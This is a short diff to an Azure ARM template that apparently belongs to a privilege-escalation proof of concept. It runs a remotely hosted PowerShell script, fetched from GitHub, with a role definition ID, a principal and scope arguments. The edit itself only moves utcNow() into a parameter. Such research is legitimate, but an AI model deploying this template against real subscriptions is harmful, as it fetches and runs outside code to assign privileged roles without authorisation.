@@ -14,6 +14,10 @@
         "roleDefinitionId": {
             "type": "string",
             "defaultValue": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
+        },
+        "utc": {
+            "type": "string",
+            "defaultValue": "[utcNow()]"
         }
     },
     "resources": [
@@ -30,7 +34,7 @@
                 }
             },
             "properties": {
-                "forceUpdateTag": "[utcNow()]",
+                "forceUpdateTag": "[parameters('utc')]",
                 "azPowerShellVersion": "5.4",
                 "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2} -resourceGroup {3}', subscription().subscriptionId, parameters('roleDefinitionId'), parameters('principalId'), resourceGroup().Id)]",
                 "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/miaow.ps1",
